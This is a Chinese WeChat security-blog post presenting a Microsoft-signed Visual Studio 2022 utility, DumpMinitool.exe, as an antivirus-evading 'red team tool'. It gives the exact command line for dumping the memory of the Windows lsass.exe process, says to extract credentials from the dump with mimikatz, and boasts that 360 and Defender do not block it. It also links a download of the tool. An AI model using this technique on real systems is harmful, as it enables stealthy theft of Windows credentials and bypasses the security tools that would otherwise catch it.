#  红队工具 | Visual Studio2022微软白名单免杀dump lsass的免杀工具

HACK学习君  [ HACK学习君 ](javascript:void\(0\);)

**HACK学习君** ![]()

微信号 XHacker1961

功能介绍
HACK学习，专注于网络安全攻防与黑客精神，分享技术干货，代码审计，安全工具开发，实战渗透，漏洞挖掘，网络安全资源分享，为广大网络安全爱好者和从业人员提供一个交流学习分享的平台

____

__

收录于话题 #安全干货 21个

消息来源推特，推特博主：mr.d0x

  * 

    
    
    https://twitter.com/mrd0x/status/1511415432888131586?s=20&t=twOtT_clemvEYGQ9YdZ02w

可以自行安装Visual Studio2022，然后访问路径，把工具拖出来使用即可，也可以直接在文末获取下载地址  

  

![](https://gitee.com/fuli009/images/raw/master/public/20220412210402.png)

  

转储 LSASS，该工具文件路径：

  * 

    
    
    C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions

文件名：DumpMinitool.exe

![](https://gitee.com/fuli009/images/raw/master/public/20220412210415.png)

参数区分大小写  

使用命令：

  *   *   *   * 

    
    
    DumpMinitool.exe --file dump.txt --processId xxx --dumpType Full--file 输出的路径--processId lsass.exe进程的ID--dumpType 方式

查看lsass进程ID

![](https://gitee.com/fuli009/images/raw/master/public/20220412210417.png)

dump完成后，再使用mimikatz进行离线解密即可  

![](https://gitee.com/fuli009/images/raw/master/public/20220412210418.png)

mimikatz

![](https://gitee.com/fuli009/images/raw/master/public/20220412210420.png)

微软的数字签名

![]()

  

免杀测试：360和Win10自带的defender杀软均不拦截。

  

沙箱检测

![](https://gitee.com/fuli009/images/raw/master/public/20220412210421.png)

微步在线  

![](https://gitee.com/fuli009/images/raw/master/public/20220412210423.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20220412210425.png)  

  

 **下载地址：**

 **  
**

链接：https://pan.baidu.com/s/18IRSjJaM4d2fwjmK9zfQFg

提取码：tfz4

 **  
**

 **点赞，转发，在看**

  

![](https://gitee.com/fuli009/images/raw/master/public/20220412210426.png)

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

